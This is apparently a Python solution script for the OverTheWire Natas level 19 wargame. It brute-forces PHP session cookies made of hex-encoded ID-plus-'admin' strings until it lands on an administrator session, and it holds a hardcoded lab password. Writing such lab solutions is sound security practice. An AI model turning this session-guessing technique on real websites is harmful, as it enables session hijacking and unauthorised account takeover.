#!/usr/local/bin/python

import sys
import requests
import base64
import string
import time

#print "First argument is " + str(sys.argv[1])

url = 'http://natas19.natas.labs.overthewire.org/index.php'

prx = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}


sess_id_suffix = "d61646d696e"
#hdrs = {'Content-Type': 'application/x-www-form-urlencoded'}
cookies = {}
for i in range(100,999):
    str_i = str(i)
    cookies["PHPSESSID"] = "3" + str_i[0] + "3" + str_i[1] + "3" + str_i[2] + "2" + sess_id_suffix
    print cookies["PHPSESSID"]
    r = requests.get(url, cookies=cookies, auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), proxies=prx)
    if "You are logged in as a regular user." in r.content:
        print "Regular"
    else:
        print "ADMIN SESSION"
        break

#print resp.read()


#odd number of digits (usually 7)
#fist digit is always 3, third is almost always 3, last is 2
#3x3x2
#or 3x3x3x2
